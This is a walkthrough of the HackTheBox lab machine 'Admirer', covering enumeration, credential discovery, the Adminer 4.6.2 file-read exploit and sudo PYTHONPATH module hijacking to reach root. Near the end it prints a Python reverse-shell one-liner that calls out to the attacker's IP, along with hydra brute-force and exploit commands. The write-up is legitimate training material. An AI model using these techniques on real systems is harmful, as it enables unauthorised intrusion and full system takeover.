# Admirer: Easy

```sh
sudo vim /etc/hosts
# add admirer.htb

nmap -T4 -p- -A -Pn -v admirer.htb
```

* open ports & services:

    * 21/tcp: ftp: vsftpd 3.0.3
    * 22/tcp: ssh: OpenSSH 7.4p1 Debian 10+deb9u7
    * 80/tcp: http: Apache httpd 2.4.25

* ```nmap``` scan also shows that the webpage has an entry in its '/robots.txt' file for a page '/admin-dir'

* we can try checking the ```ftp``` service for anonymous login but it does not work:

* the ```ftp``` service just shows the prompt for a name, and entering any name leads to a 'Login failed' error

* checking the webpage, it contains some artwork and description; the page includes a contact form but nothing happens on submitting the form

* the 'robots.txt' file includes a possible username 'waldo', and the disallowed directory '/admin-dir'

* navigating to '/admin-dir' leads to a 403 Forbidden error

* web scan:

    ```sh
    feroxbuster -u http://admirer.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # recursive dir scan with small wordlist

    ffuf -c -u 'http://admirer.htb' -H 'Host: FUZZ.admirer.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 6051 -s
    # subdomain scan

    feroxbuster -u http://admirer.htb/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # recursive dir scan with medium wordlist
    ```

* the directory scan using ```feroxbuster``` gives us a page: '/admin-dir/contacts.txt': which gives a list of members in the team with their roles:

    * Penny: 'p.wise@admirer.htb': admin
    * Rajesh: 'r.nayyar@admirer.htb': developer
    * Amy: 'a.bialik@admirer.htb': developer
    * Leonard: 'l.galecki@admirer.htb': developer
    * Howard: 'h.helberg@admirer.htb': designer
    * Bernadette: 'b.rauch@admirer.htb': designer

* the second scan using ```feroxbuster``` and a bigger wordlist gives us one more page: '/admin-dir/credentials.txt': this page gives us a few creds:

    * internal mail account: 'w.cooper@admirer.htb:fgJr6q#S\W:$P'
    * FTP account: 'ftpuser:%n?4Wz}R$tTF7'
    * Wordpress account: 'admin:w0rdpr3ss01!'

* we can try the creds for 'w.cooper' for SSH login: but that does not work

* we can log into ```ftp``` and check for any clues:

    ```sh
    ftp admirer.htb
    # the password for 'ftpuser' works

    ls -la
    # we have 2 files

    get dump.sql

    get html.tar.gz

    exit
    ```

* we can check the files for any clues now:

    ```sh
    file dump.sql

    less dump.sql
    # includes readable SQL dump

    tar -xvf html.tar.gz

    ls -la
    # check the non-default files

    ls -la utility-scripts/

    less utility-scripts/admin_tasks.php

    less utility-scripts/db_admin.php

    ls -la w4ld0s_s3cr3t_d1r/

    less w4ld0s_s3cr3t_d1r/contacts.txt

    less w4ld0s_s3cr3t_d1r/credentials.txt
    ```

    * the SQL dump includes the DB information with respect to the webpage, but there is no sensitive info like usernames or passwords

    * extracting the '.tar.gz' file gives us multiple files for the webpage: and it includes some additional files which were not found earlier

    * there is a PHP script 'admin_tasks.php' for a webpage 'Administrative Tasks': and this includes a few interactive options, but some of them are not working currently due to lack of root privileges:

        ```php
        <html>
        <head>
        <title>Administrative Tasks</title>
        </head>
        <body>
        <h3>Admin Tasks Web Interface (v0.01 beta)</h3>
        <?php
        // Web Interface to the admin_tasks script
        // 
        if(isset($_REQUEST['task']))
        {
            $task = $_REQUEST['task'];
            if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
            $task == '5' || $task == '6' || $task == '7')
            {
            /*********************************************************************************** 
                 Available options:
                1) View system uptime
                2) View logged in users
                3) View crontab (current user only)
                4) Backup passwd file (not working)
                5) Backup shadow file (not working)
                6) Backup web data (not working)
                7) Backup database (not working)

                NOTE: Options 4-7 are currently NOT working because they need root privileges.
                        I'm leaving them in the valid tasks in case I figure out a way
                        to securely run code as root from a PHP page.
            ************************************************************************************/
            echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
            }
            else
            {
            echo("Invalid task.");
            }
        } 
        ?>

        <p>
        <h4>Select task:</p>
        <form method="POST">
            <select name="task">
            <option value=1>View system uptime</option>
            <option value=2>View logged in users</option>
            <option value=3>View crontab</option>
            <option value=4 disabled>Backup passwd file</option>
            <option value=5 disabled>Backup shadow file</option>
            <option value=6 disabled>Backup web data</option>
            <option value=7 disabled>Backup database</option>
            </select>
            <input type="submit">
        </form>
        </body>
        </html>
        ```

    * the 'db_admin.php' file gives us the MySQL DB creds 'waldo:Wh3r3_1s_w4ld0?'

    * the other directory 'w4ld0s_s3cr3t_d1r' includes the files 'contacts.txt' and 'credentials.txt'

    * the 'contacts.txt' file is unchanged, but the 'credentials.txt' file includes an extra pair of credentials for a bank account: 'waldo.11:Ezy]m27}OREc$'

* as we have several pairs of credentials, we can first try logging via SSH using ```hydra``` to bruteforce:

    ```sh
    vim usernames.txt
    # update list of usernames

    vim passwords.txt
    # update list of passwords

    hydra -L usernames.txt -P passwords.txt ssh://admirer.htb -t 4
    # this shows 'ftpuser' has valid creds
    ```

* ```hydra``` shows the creds 'ftpuser:%n?4Wz}R$tTF7' is valid for SSH, but if we log into SSH we get logged out immediately and the connection is closed: so it is likely not allowed

* as we do not have valid creds for SSH, we can check for the 'admin_tasks.php' webpage: we can check the following paths:

    * 'http://admirer.htb/admin_tasks.php': not found
    * 'http://admirer.htb/admin-dir/admin_tasks.php': not found
    * 'http://admirer.htb/utility-scripts/admin_tasks.php': this works

* we are able to access the admin tasks web interface at 'http://admirer.htb/utility-scripts/admin_tasks.php'

* we can interact with this first to check each of the options: the options 4-7 are greyed out, so we can try checking the requests in Burp Suite:

    * intercept a valid request for selecting one of the tasks and submitting the query

    * we can see a POST call is made with the data 'task=1'; and we get the system uptime in response

    * we can similarly check for the other tasks, including the greyed out ones, by testing values 1 to 7 for 'task'

    * if we try task values 4 to 7, we get the error 'Insufficient privileges to perform the selected operation'

* from the PHP script code for this, we can see that the script checks if the 'task' value is any of the numbers from 1 to 7: if it is, the value is passed on to the script ```/opt/scripts/admin_tasks.sh``` for execution via the ```shell_exec``` module; if 'task' value does not match, then we get the error for invalid task

* as we do not have a direct way to test for any injection attacks, we can continue to enumerate the new directory:

    ```sh
    feroxbuster -u http://admirer.htb/utility-scripts -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,js,md --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    # dir scan for '/utility-scripts' with big wordlist
    ```

* the directory scan using ```gobuster``` with a bigger wordlist finds a few pages like 'info.php', 'phptest.php' and 'adminer.php'

* the first two files do not give any useful info; the 'adminer.php' leads to a web login page for Adminer 4.6.2

* Google shows that Adminer is a DB management PHP tool; searching for exploits associated with this version leads to [CVE-2021-43008: an arbitrary file read exploit](https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/)

* the exploit requires access to login page of Adminer, and to connect back to a remote MySQL DB controlled by attacker; then files can be read using ```LOAD DATA LOCAL INFILE``` queries

* for the login page at 'http://admirer.htb/utility-scripts/adminer.php', we have the following fields:

    * system: MySQL selected by default
    * server: 'localhost' by default
    * username
    * password
    * database

* we can try reusing the DB creds 'waldo:Wh3r3_1s_w4ld0?' found from 'db_admin.php' earlier: but these do not work and we get the error "access denied for user 'waldo'@'localhost'"

* similarly, we can try reusing all the creds found earlier, but none of them work and we get the same error

* from the login page, the only field that we can control is the server field: so we can try setting up a MySQL server on our machine with our own users, and then try logging into Adminer

* MySQL setup:

    ```sh
    sudo systemctl status mysql
    # linked to mariadb service, currently inactive

    sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf
    # change 'bind-address' from 127.0.0.1 to 0.0.0.0
    # so that we can access it remotely

    sudo systemctl start mariadb
    # start service

    sudo mysql -u root -p
    # no password by default

    ALTER USER 'root'@'localhost' IDENTIFIED BY 'yourboxpassword';
    # create password for root user

    create database testing;

    create user 'newtestuser'@'%' identified by 'newtestpass';
    # '%' to indicate that the user can login from anywhere

    grant all privileges on testing.* to 'newtestuser'@'%';

    flush privileges;
    ```

* now that we have created a new user and DB in our MySQL server, we can use these fields to log into Adminer:

    * system: MySQL
    * server: 10.10.14.95
    * username: newtestuser
    * password: newtestpass
    * database: testing

* now, we can follow the [exploit part from this blog for the local file read](https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/):

    * in Adminer, after logging in, if no tables are created, create a 'test' table:

        * click on 'Create table'
        * give any table name, select the engine as 'InnoDB', and collation as 'utf8mb4_general_ci' (following the exmaple from the blog post)
        * create a column with any name, type set to 'mediumtext', and the rest can be set to default values
    
    * next, navigate to 'SQL Command' page

    * we can read a local file on the Adminer server and load it into the 'test' table by executing this command:

        ```sql
        LOAD DATA local INFILE '/etc/passwd' INTO TABLE test fields TERMINATED BY "\n";
        ```
    
    * we get an error ```Error in query (2000): open_basedir restriction in effect. Unable to open file ```

    * it is likely that we cannot read ```/etc/passwd``` due to directory restrictions, so we can try other files like ```/var/www/html/index.php```
    
    * then, we can read the file from our 'test' table:

        ```sql
        SELECT * FROM test;
        ```

* attempting to read local files using the Adminer exploit shows we have directory restrictions for many files

* however, the web file ```/var/www/html/index.php``` discloses the MySQL creds 'waldo:&<h5b~yK3F#{PaPB&dA}{H>' for the DB 'admirerdb'

* we can now try to re-use these creds for SSH login as 'waldo':

    ```sh
    ssh waldo@admirer.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that we can run the following command: ```(ALL) SETENV: /opt/scripts/admin_tasks.sh```

* we can check more on the script:

    ```sh
    ls -la /opt

    ls -la /opt/scripts
    # we have two scripts

    cat /opt/scripts/admin_tasks.sh

    cat /opt/scripts/backup.py
    ```

* the 'admin_tasks.sh' script has the same options as checked before from web: but with root privileges, we can run all options now:

    ```sh
    #!/bin/bash

    view_uptime()
    {
        /usr/bin/uptime -p
    }

    view_users()
    {
        /usr/bin/w
    }

    view_crontab()
    {
        /usr/bin/crontab -l
    }

    backup_passwd()
    {
        if [ "$EUID" -eq 0 ]
        then
            echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
            /bin/cp /etc/passwd /var/backups/passwd.bak
            /bin/chown root:root /var/backups/passwd.bak
            /bin/chmod 600 /var/backups/passwd.bak
            echo "Done."
        else
            echo "Insufficient privileges to perform the selected operation."
        fi
    }

    backup_shadow()
    {
        if [ "$EUID" -eq 0 ]
        then
            echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
            /bin/cp /etc/shadow /var/backups/shadow.bak
            /bin/chown root:shadow /var/backups/shadow.bak
            /bin/chmod 600 /var/backups/shadow.bak
            echo "Done."
        else
            echo "Insufficient privileges to perform the selected operation."
        fi
    }

    backup_web()
    {
        if [ "$EUID" -eq 0 ]
        then
            echo "Running backup script in the background, it might take a while..."
            /opt/scripts/backup.py &
        else
            echo "Insufficient privileges to perform the selected operation."
        fi
    }

    backup_db()
    {
        if [ "$EUID" -eq 0 ]
        then
            echo "Running mysqldump in the background, it may take a while..."
            #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
            /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
        else
            echo "Insufficient privileges to perform the selected operation."
        fi
    }

    # Non-interactive way, to be used by the web interface
    if [ $# -eq 1 ]
    then
        option=$1
        case $option in
            1) view_uptime ;;
            2) view_users ;;
            3) view_crontab ;;
            4) backup_passwd ;;
            5) backup_shadow ;;
            6) backup_web ;;
            7) backup_db ;;

            *) echo "Unknown option." >&2
        esac

        exit 0
    fi

    # Interactive way, to be called from the command line
    options=("View system uptime"
            "View logged in users"
            "View crontab"
            "Backup passwd file"
            "Backup shadow file"
            "Backup web data"
            "Backup DB"
            "Quit")

    echo
    echo "[[[ System Administration Menu ]]]"
    PS3="Choose an option: "
    COLUMNS=11
    select opt in "${options[@]}"; do
        case $REPLY in
            1) view_uptime ; break ;;
            2) view_users ; break ;;
            3) view_crontab ; break ;;
            4) backup_passwd ; break ;;
            5) backup_shadow ; break ;;
            6) backup_web ; break ;;
            7) backup_db ; break ;;
            8) echo "Bye!" ; break ;;

            *) echo "Unknown option." >&2
        esac
    done

    exit 0
    ```

* checking the other script 'backup.py', it is the script that takes the backup of the web directory:

    ```py
    #!/usr/bin/python3

    from shutil import make_archive

    src = '/var/www/html/'

    # old ftp directory, not used anymore
    #dst = '/srv/ftp/html'

    dst = '/var/backups/html'

    make_archive(dst, 'gztar', src)
    ```

* the 'backup.py' script is referred in the sysadmin tasks script under option 6, where it backups the web data

* we can try running the script as sudo to check for all options:

    ```sh
    sudo /opt/scripts/admin_tasks.sh
    ```

* checking all the options, we do not have any way to use injection attacks as the script shows it is an invalid option; and we do not have any useful data from the backups

* the crontab option shows that there is a cronjob running every 3 minutes which runs the following commands:

    * ```rm -r /tmp/*.* >/dev/null 2>&1```
    * ```rm /home/waldo/*.p* >/dev/null 2>&1```

* now, the ```sudo -l``` command includes ```SETENV``` - which is for setting env vars: and it is not a default setting

* Googling for privesc exploits associated with ```SETENV``` leads to [examples of Python module hijacking using SETENV](https://exploitnotes.org/exploit/linux/privilege-escalation/python#module-hijacking), where the ```PYTHONPATH``` var can be changed when executing a script, such that a malicious module can be loaded

* we can try using the Python module hijacking exploit:

    * in the 'backup.py' script, which is referred in the web backup option in 'admin_tasks.sh', it uses the module 'shutil': as seen from the line ```from shutil import make_archive```

    * we can forge the imported module using a malicious 'shutil.py' file

    * as the files in ```/tmp``` and ```/home/waldo``` get removed every few minutes, we can choose other temporary directories like ```/var/tmp``` or ```/dev/shm```:

        ```sh
        cd /var/tmp

        nano shutil.py
        # use reverse shell one-liner
        ```

        ```py
        import socket,os,pty;s=socket.socket();s.connect(("10.10.14.95",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
        ```

        ```sh
        # on attacker
        # setup listener
        nc -nvlp 4444
        ```
    
    * now, we can run the script with ```PYTHONPATH``` set to ```/var/tmp``` - and in the script, we can select option 6 for web backup, so that it runs 'backup.py':

        ```sh
        sudo PYTHONPATH=/var/tmp/ /opt/scripts/admin_tasks.sh
        # select '6' for web backup
        ```
    
    * this works, and we get root shell on our listener:

        ```sh
        id
        # root

        cat /root/root.txt
        # root flag
        ```

* after this, as the MySQL setup done previously is no longer required, we can remove the global access and the user created:

    ```sh
    sudo mysql -u root -p

    drop user 'newtestuser'@'%';

    flush privileges;

    exit;

    sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf
    # change 'bind-address' back to default 127.0.0.1
    ```
